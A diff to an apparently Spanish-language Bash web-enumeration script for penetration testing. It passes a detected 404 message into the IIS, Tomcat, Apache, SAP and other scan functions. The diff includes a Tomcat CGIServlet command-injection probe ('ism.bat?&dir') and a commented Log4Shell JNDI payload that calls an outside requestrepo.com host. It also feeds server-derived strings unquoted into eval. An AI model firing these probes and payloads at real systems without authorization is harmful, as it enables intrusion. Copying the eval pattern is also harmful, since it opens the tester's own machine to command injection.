@@ -348,11 +348,16 @@ function enumeracionDefecto() {
     proto_http=$1
     host=$2
     port=$3
+	msg_error_404=$4 #cadena en comillas simples
+  	
+	if [ ! -z "$msg_error_404" ];then
+		param_msg_error="-error404 $msg_error_404" 
+	else
+		param_msg_error=""
+	fi
 
-    echo -e "\t[+] Default enumeration ($proto_http : $host : $port)"
-
+    echo -e "\t[+] Default enumeration ($proto_http : $host : $port [$param_msg_error])"
     waitWeb 0.3
-
     egrep -qiv "$NOscanList" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
     greprc=$?
 
@@ -410,6 +415,13 @@ function enumeracionSharePoint() {
     proto_http=$1
     host=$2
     port=$3
+	msg_error_404=$4 #cadena en comillas simples
+  	
+	if [ ! -z "$msg_error_404" ];then
+		param_msg_error="-error404 $msg_error_404" 
+	else
+		param_msg_error=""
+	fi
 
     #1: si no existe log
     if [[ ! -e "logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_SharePoint.txt" ]]; then
@@ -434,10 +446,17 @@ function enumeracionIIS() {
     proto_http=$1
     host=$2
     port=$3
+	msg_error_404=$4 #cadena en comillas simples
+  	
+	if [ ! -z "$msg_error_404" ];then
+		param_msg_error="-error404 $msg_error_404" 
+	else
+		param_msg_error=""
+	fi
 
     #1: si no existe log
     if [[ ! -e "logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt" ]]; then
-        echo -e "\t[+] Enumerar IIS ($proto_http : $host : $port)"
+        echo -e "\t[+] Enumerar IIS ($proto_http : $host : $port [$param_msg_error])"
         egrep -iq "IIS/6.0|IIS/5.1" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
         IIS6=$?
         if [[ $IIS6 -eq 0 ]]; then
@@ -539,9 +558,9 @@ function enumeracionApi() {
     proto_http=$1
     host=$2
     port=$3
+	msg_error_404=$4
   	waitWeb 0.3
-	echo -e "\t\t[+] Revisando archivos API ($host - nginx)"
-
+	
 	if [ ! -z "$msg_error_404" ];then
 		# Eliminar el último carácter de msg_error_404
 		msg_error_404_modified="${msg_error_404%?}"
@@ -550,6 +569,7 @@ function enumeracionApi() {
 		param_msg_error="-error404 'not found'"
 	fi
 
+	echo -e "\t\t[+] Revisando archivos API ($host - nginx [$param_msg_error])"
 	command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module api -threads $hilos_web -redirects 0 -show404 $param_msg_error"
 	echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_api.txt
 	eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_api.txt &
@@ -559,10 +579,17 @@ function enumeracionApache() {
     proto_http=$1
     host=$2
     port=$3
+	msg_error_404=$4 #cadena en comillas simples
+  	
+	if [ ! -z "$msg_error_404" ];then
+		param_msg_error="-error404 $msg_error_404" 
+	else
+		param_msg_error=""
+	fi
 
     #1: si no existe log
     if [[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_apacheNuclei.txt" ]]; then
-        echo -e "\t\t[+] Enumerar Apache ($proto_http : $host : $port)"
+        echo -e "\t\t[+] Enumerar Apache ($proto_http : $host : $port [$param_msg_error])"
         waitWeb 0.3
         echo -e "\t\t[+] Nuclei apache $proto_http $host:$port"
         command="nuclei -u '$proto_http://$host:$port' -id /root/.local/nuclei-templates/cves/apache.txt -no-color -include-rr -debug"
@@ -698,10 +725,17 @@ function enumeracionTomcat() {
     proto_http=$1
     host=$2
     port=$3
+	msg_error_404=$4 #cadena en comillas simples
+  	
+	if [ ! -z "$msg_error_404" ];then
+		param_msg_error="-error404 $msg_error_404" 
+	else
+		param_msg_error=""
+	fi
 
     #1: si no existe log
     if [[ ! -e "logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt" ]]; then
-        echo -e "\t\t[+] Enumerar Tomcat ($proto_http : $host : $port)"
+        echo -e "\t\t[+] Enumerar Tomcat ($proto_http : $host : $port [$param_msg_error])"
 
         command="$proxychains curl -k --max-time 10 '$proto_http'://$host:$port/cgi/ism.bat?&dir"
         echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CGIServlet.txt
@@ -784,11 +818,18 @@ function enumeracionSAP () {
    proto_http=$1
    host=$2
    port=$3
+   msg_error_404=$4 #cadena en comillas simples
+  	
+	if [ ! -z "$msg_error_404" ];then
+		param_msg_error="-error404 $msg_error_404" 
+	else
+		param_msg_error=""
+	fi
 
    	#1: si no existe log
    	if [[ ! -e logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_sap-nuclei.txt  ]]; then
 
-		echo -e "\t\t[+] Enumerar SAP ($proto_http : $host : $port)"
+		echo -e "\t\t[+] Enumerar SAP ($proto_http : $host : $port [$param_msg_error])"
 		waitWeb 0.3
 		SAP-scan -url=$proto_http://$host:$port > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_sap-scan.txt &
 
@@ -1375,14 +1416,13 @@ for line in $(cat $TARGETS); do
 			msg_error_404=''
 			status_code_nonexist1=`getStatus -url $proto_http://${host}:${port}${path_web}nonexisten/45s/`
 			only_status_code_nonexist=$status_code_nonexist1
-
 			if [ "$VERBOSE" == '1' ]; then  echo -e "\t[+] status_code_nonexist1: $status_code_nonexist1 "; fi
+
 			if [[  "$status_code_nonexist1" == *":"*  ]]; then # devuelve 200 OK pero se detecto un mensaje de error 404
 				msg_error_404=$(echo $status_code_nonexist1 | cut -d ':' -f2)
 				msg_error_404="'$msg_error_404'"
 				only_status_code_nonexist=`echo $status_code_nonexist1 | cut -d ':' -f1`
 			fi
-			echo "status_code_nonexist1 $status_code_nonexist1"
 
 			status_code_nonexist2=`getStatus -url $proto_http://${host}:${port}${path_web}graphql.php`
 			if [ "$VERBOSE" == '1' ]; then  echo -e "\t[+] status_code_nonexist2: $status_code_nonexist2 "; fi
@@ -1391,7 +1431,6 @@ for line in $(cat $TARGETS); do
 				msg_error_404="'$msg_error_404'"
 				only_status_code_nonexist=`echo $status_code_nonexist2 | cut -d ':' -f1`
 			fi
-			echo "status_code_nonexist2 $status_code_nonexist2"
 
 			# si la primera peticion fue error de red
 			if [[ "$status_code_nonexist1" == *"Network error"* && "$status_code_nonexist2" != *":"* ]]; then
@@ -1405,7 +1444,6 @@ for line in $(cat $TARGETS); do
 			fi
 
 			if [ ! -z "$msg_error_404" ];then
-				param_msg_error="-error404 '$msg_error_404'" #parametro para web-buster
 				only_status_code_nonexist=404
 				echo "new only_status_code_nonexist $only_status_code_nonexist ($msg_error_404)"
 			fi
@@ -1563,7 +1601,7 @@ for line in $(cat $TARGETS); do
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es Apache y no se enumero antes
 						checkRAM
-						enumeracionApache "$proto_http" $host $port
+						enumeracionApache "$proto_http" $host $port $msg_error_404
 					fi
 					####################################
 
@@ -1572,7 +1610,7 @@ for line in $(cat $TARGETS); do
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es nginx y no se enumero antes
 						checkRAM
-						enumeracionApi "$proto_http" $host $port
+						enumeracionApi "$proto_http" $host $port $msg_error_404
 					fi
 					
 
@@ -1581,7 +1619,7 @@ for line in $(cat $TARGETS); do
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es SharePoint
 						checkRAM
-						enumeracionSharePoint "$proto_http" $host $port
+						enumeracionSharePoint "$proto_http" $host $port $msg_error_404
 					fi
 					####################################
 
@@ -1590,7 +1628,7 @@ for line in $(cat $TARGETS); do
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es IIS y no se enumero antes
 						checkRAM
-						enumeracionIIS "$proto_http" $host $port
+						enumeracionIIS "$proto_http" $host $port $msg_error_404
 					fi
 					####################################
 					
@@ -1599,7 +1637,7 @@ for line in $(cat $TARGETS); do
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes
 						checkRAM
-						enumeracionTomcat "$proto_http" $host $port
+						enumeracionTomcat "$proto_http" $host $port $msg_error_404
 						#  ${jndi:ldap://z4byndtm.requestrepo.com/z4byndtm}   #log4shell
 					fi
 					####################################
@@ -1632,7 +1670,7 @@ for line in $(cat $TARGETS); do
 					echo -e "\t\t[+] serverType $serverType"
 					if [  -z "$serverType" ]; then
 						checkRAM
-						enumeracionDefecto "$proto_http" $host $port
+						enumeracionDefecto "$proto_http" $host $port $msg_error_404
 					fi
 
 					#######  if the server is IoT ######
